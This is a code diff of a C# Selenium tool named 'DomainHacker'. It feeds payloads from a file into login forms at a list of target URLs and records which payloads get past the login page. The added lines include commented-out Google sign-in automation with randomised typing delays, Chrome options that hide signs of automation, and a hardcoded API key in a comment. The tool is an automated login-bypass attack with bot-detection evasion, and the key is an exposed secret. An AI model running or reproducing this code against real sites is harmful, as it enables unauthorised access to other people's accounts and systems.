@@ -15,12 +15,11 @@ namespace DomainHacker
         static void Main(string[] args)
         {
             Console.WriteLine("Press c for chrome and f for firefox");
-            string browser = Console.ReadLine();          
+            string browser = Console.ReadLine();
 
-            string[] urls = File.ReadAllLines(@"urls.txt");
             string[] payloads = File.ReadAllLines(@"payloads.txt");
-            FileStream fileStream = new FileStream(@"allowed.txt", FileMode.Append, FileAccess.Write);
-            StreamWriter writer = new StreamWriter(fileStream);
+            FileStream allowedFileStream = new FileStream(@"allowed.txt", FileMode.Append, FileAccess.Write);
+            StreamWriter allowedWriter = new StreamWriter(allowedFileStream);
 
             IWebDriver driver = null;
             if(browser.ToLower() == "c")
@@ -32,7 +31,17 @@ namespace DomainHacker
                 driver=CreateFirefoxDriver();
             }
 
-            if(driver != null)
+            //string googleCustomSearchApiKey = "AIzaSyCIB9XRDpeOYR0Mcl52dwRMmbE4lJetns8";
+            
+
+
+
+
+            //Console.WriteLine("Update urls.text file and close then press here enter");
+            //Console.ReadLine(); 
+
+            string[] urls = File.ReadAllLines(@"urls.txt");
+            if (driver != null)
             {
                 foreach (string url in urls)
                 {
@@ -141,9 +150,9 @@ namespace DomainHacker
                                 string currentUrl = driver.Url;
                                 if (!currentUrl.Contains("login.php") && !currentUrl.Contains("error"))
                                 {
-                                    writer.WriteLine(url + "    " + payload);
-                                    writer.Flush();
-                                    fileStream.Flush();
+                                    allowedWriter.WriteLine(url + "    " + payload);
+                                    allowedWriter.Flush();
+                                    allowedFileStream.Flush();
                                 }
                             }
                             catch (Exception) { }
@@ -153,14 +162,36 @@ namespace DomainHacker
                         counter++;
                     }
                 }
-                writer.Close();
-                fileStream.Close();
+                allowedWriter.Close();
+                allowedFileStream.Close();
                 driver.Dispose();
                 //KillProcesses();
             }
         }
 
 
+        //driver.Navigate().GoToUrl("https://accounts.google.com/signin/v2/identifier?flowName=GlifWebSignIn&flowEntry=ServiceLogin");
+        //string id = "johnsmithid012";
+        //string pw = "idsmithjohn@012";
+        //int x = 0;
+        //Random random = new Random();
+        //while(x < id.Length)
+        //{
+        //    Thread.Sleep(random.Next(5, 20) * 100);
+        //    driver.FindElement(By.CssSelector("#identifierId")).SendKeys(id[x].ToString());
+        //    x++;
+        //}
+        //driver.FindElement(By.CssSelector("#identifierId")).SendKeys(Keys.Enter);
+        //driver.Navigate().GoToUrl("https://accounts.google.com/signin/v2/challenge/pwd?flowName=GlifWebSignIn&flowEntry=ServiceLogin&cid=1&navigationDirection=forward&TL=AM3QAYZpUYwLtvN3kAIfn7B7k20NrWvJ3d5cvUXbZX30O1F-0brsww1dE5ZxOE3h");
+        //Thread.Sleep(3000);
+        //int y = 0;
+        //while(y < pw.Length)
+        //{
+        //    Thread.Sleep(random.Next(5, 20) * 100);
+        //    driver.FindElement(By.CssSelector("#password")).SendKeys(pw[y].ToString());
+        //    y++;
+        //}
+        //driver.FindElement(By.CssSelector("#password > div:nth-child(1) > div:nth-child(1) > div:nth-child(1) > input:nth-child(1)")).SendKeys(Keys.Enter);
 
 
 
@@ -183,7 +214,7 @@ namespace DomainHacker
         {
             ChromeOptions options = new ChromeOptions();
             //options.AddArgument("--headless");
-            options.AddArgument("--no-sandbox");
+            options.AddArgument("--no-sandbox"); 
             options.AddExcludedArgument("enable-automation");
             options.AddAdditionalCapability("useAutomationExtension", false);
             ChromeDriverService service = ChromeDriverService.CreateDefaultService();
